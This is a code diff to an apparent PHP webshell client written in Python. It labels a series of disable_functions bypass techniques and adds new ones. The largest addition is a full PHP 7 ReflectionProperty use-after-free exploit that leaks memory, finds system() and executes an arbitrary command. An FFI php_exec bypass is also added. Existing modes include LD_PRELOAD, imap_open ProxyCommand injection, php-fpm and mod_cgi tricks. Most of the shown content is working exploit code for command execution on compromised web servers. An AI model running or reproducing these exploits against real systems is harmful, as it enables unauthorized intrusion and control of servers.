@@ -418,9 +418,9 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
     params_dict[raw_key][password] = phpcode
     try:
         req = Session.post(url, verify=False, **params_dict)
-    except requests.RequestException:
+    except requests.RequestException as e:
         if (not quiet):
-            print(color.red("\nRequest Error\n"))
+            print(color.red(f"\nRequest Error: {e}\n"))
         return
     if (req.apparent_encoding):
         req.encoding = encoding = req.apparent_encoding
@@ -447,7 +447,7 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
         req.r_content = decode_g(req.r_content, RAND_KEY, True)
     req.r_json = MethodType(r_json, req)
     if gget("DEBUG.SEND"):  # DEBUG
-        print(color.yellow(f"-----DEBUG START------"))
+        print(color.yellow("-----DEBUG START------"))
         print(f"[{req.status_code}] {url} length: {len(req.r_text)} time: {req.elapsed.total_seconds()}", end="")
         print(f"raw: {color.green('True')}" if raw else '')
         for k, v in params_dict.items():
@@ -455,12 +455,12 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
             pprint(v)
         print("raw payload:\n" + raw_data)
         if (req.text):
-            print(color.green(f"----DEBUG RESPONSE----"))
+            print(color.green("----DEBUG RESPONSE----"))
             print(req.r_text)
         else:
-            print(color.green(f"----DEBUG RAW RESPONSE----"))
+            print(color.green("----DEBUG RAW RESPONSE----"))
             print(req.text)
-        print(color.yellow(f"------DEBUG END-------\n"))
+        print(color.yellow("------DEBUG END-------\n"))
     return req
 
 
@@ -509,7 +509,7 @@ def prepare_system_template(exec_func: str):
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
     bdf_mode = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
     print_command = "print($o);" if print_result else ""
-    if (bdf_mode == 1):
+    if (bdf_mode == 1):  # php7-backtrace
         return """$o=pwn(base64_decode("%s"));
 function pwn($cmd) {
     global $abc, $helper, $backtrace;
@@ -720,7 +720,7 @@ function pwn($cmd) {
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
-    elif (bdf_mode == 2):
+    elif (bdf_mode == 2):  # php7-gc
         return """$o=pwn(base64_decode("%s"));
 
 function pwn($cmd) {
@@ -927,7 +927,7 @@ function pwn($cmd) {
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
-    elif (bdf_mode == 3):
+    elif (bdf_mode == 3):  # php7-json
         return """$cmd = base64_decode("%s");
 $n_alloc = 10; # increase this value if you get segfaults
 
@@ -1184,7 +1184,7 @@ class Z implements JsonSerializable {
 $y = [new Z()];
 json_encode([&$y]);
 $o=$GLOBAL['o'];""" % (base64_encode(command), print_command)
-    elif (bdf_mode == 4):
+    elif (bdf_mode == 4):  # LD_PRELOAD
         ld_preload_func = gget("webshell.ld_preload_func", "webshell")
         ld_preload_command = ""
         if (ld_preload_func == "mail"):
@@ -1207,7 +1207,7 @@ unlink($p);
          gget("webshell.ld_preload_path", "webshell"),
          ld_preload_command,
          print_command)
-    elif (bdf_mode == 5):
+    elif (bdf_mode == 5):  # FFI
         return """$f=FFI::cdef("void *popen(const char *command, const char *type);
 int pclose(void * stream);
 int fgetc (void *fp);","libc.so.6");
@@ -1217,13 +1217,13 @@ $d="";while(($c=$f->fgetc($o))!=-1)
 $f->pclose($o);
 $o=hex2bin($d);
 %s""" % (base64_encode(command), print_command)
-    elif (bdf_mode == 6):
+    elif (bdf_mode == 6):  # COM
         return """$wsh = new COM('WScript.shell');
 $exec = $wsh->exec("cmd /c ".base64_decode("%s"));
 $stdout = $exec->StdOut();
 $o = $stdout->ReadAll();
 %s""" % (base64_encode(command), print_command)
-    elif (bdf_mode == 7):
+    elif (bdf_mode == 7):  # imap_open
         tmpname = str(uuid4())
         return """if (!function_exists('imap_open')) {print("no imap_open function!");}
 else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
@@ -1232,7 +1232,7 @@ sleep(1);
 $o=file_get_contents("/tmp/%s");
 %s
 unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
-    elif (bdf_mode == 8):
+    elif (bdf_mode == 8):  # MYSQL-UDF
         connect_type = gget("db_connect_type", "webshell")
         if (connect_type == "pdo"):
             return """try{%s
@@ -1255,7 +1255,7 @@ $GLOBAL['o']=$o;
 $r->close();
 $con->close();
 }""" % (get_db_connect_code(), hex_encode(command), print_command)
-    elif (bdf_mode == 9):
+    elif (bdf_mode == 9):  # php7-SplDoublyLinkedList
         return """error_reporting(E_ALL);
 
 define('NB_DANGLING', 200);
@@ -1288,10 +1288,10 @@ function s2i(&$s, $p, $x=8)
 
 class UAFTrigger
 {
-	function __construct($cmd)
-	{
-		$this->cmd=$cmd;
-	}
+    function __construct($cmd)
+    {
+        $this->cmd=$cmd;
+    }
     function __destruct()
     {
         global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;
@@ -1574,7 +1574,7 @@ $dlls[NB_DANGLING]->rewind();
 
 # Trigger the bug on the first list
 $dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
-    elif (bdf_mode == 10):
+    elif (bdf_mode == 10):  # php-fpm
         bits = gget("webshell.arch", "webshell")
         is_win = gget("webshell.is_win", "webshell")
         ext_local_path = path.join(gget("root_path"), "auxiliary", "fpm")
@@ -1645,7 +1645,7 @@ die('stream_socket_client function not exist or sock not exist');
 
         phpcode += f"sleep(1);$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
         return phpcode
-    elif (bdf_mode == 11):
+    elif (bdf_mode == 11):  # apache_mod_cgi
         shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
         res = send("""$cmd = base64_decode("%s");
 $shellcode = "#!/bin/sh\\n";
@@ -1675,7 +1675,7 @@ print($f);
         phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(__DIR__.DIRECTORY_SEPARATOR.".htaccess");rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess.bak", __DIR__.DIRECTORY_SEPARATOR.".htaccess");""" % (
             o, print_command, real_shellscript_name)
         return phpcode
-    elif (bdf_mode == 12):
+    elif (bdf_mode == 12):  # iconv
         p = "/tmp/%s" % randstr(ALPATHNUMERIC, 8)
         pre_phpcode = """$p="%s";
 putenv("GCONV_PATH=/tmp/");
@@ -1688,13 +1688,160 @@ if(function_exists('iconv')){
 }
 """ % (p, base64_encode(command))
         send(pre_phpcode, quiet=True)
-        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (p, print_command)
+        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (
+            p, print_command)
 
         return phpcode
+    elif (bdf_mode == 13):  # FFI-php_exec
+        return """$f=FFI::cdef("int php_exec(int type, char *cmd);");
+ob_start();$f->php_exec(3,base64_decode("%s"));$o=ob_get_contents();ob_end_clean();
+%s""" % (base64_encode(command), print_command)
+    elif (bdf_mode == 14):  # php7-reflectionProperty
+        return """global $abc, $helper;
+        class Test {
+        public HelperHelperHelperHelperHelperHelperHelper $prop;
+        }
+        class HelperHelperHelperHelperHelperHelperHelper {
+        public $a, $b;
+        }
+        function s2n($str) {
+        $address = 0;
+        for ($i=0;$i<4;$i++){
+        $address <<= 8;
+        $address |= ord($str[4 + $i]);
+        }
+        return $address;
+        }
+        function s2b($str, $offset){
+        return hex2bin(str_pad(dechex(s2n($str) + $offset - 0x10), 8, "0",
+        STR_PAD_LEFT));
+        }
+        function leak($offset) {
+        global $abc;
+        $data = "";
+        for ($i = 0;$i < 8;$i++){
+        $data .= $abc[$offset + 7 - $i];
+        }
+        return $data;
+        }
+        function leak2($address) {
+        global $helper;
+        write(0x20, $address);
+        $leak = strlen($helper -> b);
+        $leak = dechex($leak);
+        $leak = str_pad($leak, 16, "0", STR_PAD_LEFT);
+        $leak = hex2bin($leak);
+        return $leak;
+        }
+        function write($offset, $data) {
+        global $abc;
+        $data = str_pad($data, 8, "\\x00", STR_PAD_LEFT);
+        for ($i = 0;$i < 8;$i++){
+        $abc[$offset + $i] = $data[7 - $i];
+        }
+        }
+        function get_basic_funcs($std_object_handlers) {
+        $prefix = substr($std_object_handlers, 0, 4);
+        $std_object_handlers = hexdec(bin2hex($std_object_handlers));
+        $start = $std_object_handlers & 0x00000000fffff000 | 0x0000000000000920; # change 0x920 if finding failed
+        $NumPrefix = $std_object_handlers & 0x0000ffffff000000;
+        $NumPrefix = $NumPrefix - 0x0000000001000000;
+        $funcs = get_defined_functions()['internal'];
+        for($i = 0; $i < 0x1000; $i++) {
+        $addr = $start - 0x1000 * $i;
+        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
+        "0", STR_PAD_LEFT))));
+        if (hexdec($name_addr) > $std_object_handlers || hexdec($name_addr) < $NumPrefix)
+        {
+        continue;
+        }
+        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
+        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
+        $name = explode("\\x00", $name)[0];
+        if(in_array($name, $funcs)) {
+        return [$name, bin2hex($prefix) . str_pad(dechex($addr), 8, "0", STR_PAD_LEFT),
+        $std_object_handlers, $NumPrefix];
+        }
+        }
+        }
+        function getSystem($unknown_func) {
+        $unknown_addr = hex2bin($unknown_func[1]);
+        $prefix = substr($unknown_addr, 0, 4);
+        $unknown_addr = hexdec($unknown_func[1]);
+        $start = $unknown_addr & 0x00000000ffffffff;
+        for($i = 0;$i < 0x800;$i++) {
+        $addr = $start - 0x20 * $i;
+        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
+        "0", STR_PAD_LEFT))));
+        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
+        $unknown_func[3]) {
+        continue;
+        }
+        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
+        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
+        if(strstr($name, "system")) {
+        return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
+        "0", STR_PAD_LEFT))));
+        }
+        }
+        for($i = 0;$i < 0x800;$i++) {
+        $addr = $start + 0x20 * $i;
+        $name_addr = bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10), 8,
+        "0", STR_PAD_LEFT))));
+        if (hexdec($name_addr) > $unknown_func[2] || hexdec($name_addr) <
+        $unknown_func[3]) {
+        continue;
+        }
+        $name_addr = str_pad($name_addr, 16, "0", STR_PAD_LEFT);
+        $name = strrev(leak2($prefix . s2b(hex2bin($name_addr), 0x00)));
+        if(strstr($name, "system")) {
+        return bin2hex(leak2($prefix . hex2bin(str_pad(dechex($addr - 0x10 + 0x08), 8,
+        "0", STR_PAD_LEFT))));
+        }
+        }
+        }
+        $rp = new ReflectionProperty(Test::class, 'prop');
+        $test = new Test;
+        $test -> prop = new HelperHelperHelperHelperHelperHelperHelper;
+        $abc = $rp -> getType() -> getName();
+        $helper = new HelperHelperHelperHelperHelperHelperHelper();
+        if (strlen($abc) < 1000) {
+        exit("UAF Failed!");
+        }
+        $helper -> a = $helper;
+        $php_heap = leak(0x10);
+        $helper -> a = function($x){};
+        $std_object_handlers = leak(0x0);
+        $prefix = substr($php_heap, 0, 4);
+
+        $closure_object = leak(0x10);
+
+        write(0x28, "\\x06");
+        if(!($unknown_func = get_basic_funcs($std_object_handlers))) {
+        die("Couldn't determine funcs address");
+        }
+        //echo "Find func's adress: " . $unknown_func[1] . " -> " . $unknown_func[0] . "\\n";
+        if(!($system_address = getSystem($unknown_func))) {
+        die("Couldn't determine system address");
+        }
+
+        for ($i = 0;$i < (0x130 / 0x08);$i++) {
+        write(0x308 + 0x08 * ($i + 1), leak2($prefix . s2b($closure_object, 0x08 *
+        $i)));
+        }
+        $abc[0x308 + 0x40] = "\\x01";
+        write(0x308 + 0x70, hex2bin($system_address));
+        write(0x10, $prefix . hex2bin(dechex(s2n($php_heap) + 0x18 + 0x308 + 0x08)));
+
+        ob_start();
+        ($helper -> a)(base64_decode("%s"));
+        $o=ob_get_contents();
+        ob_end_clean();
+%s""" % (base64_encode(command), print_command)
     elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
-        return f"""print("No system execute function\\n");"""
+        return """print("No system execute function\\n");"""
 
 
 def is_windows(remote: bool = True):
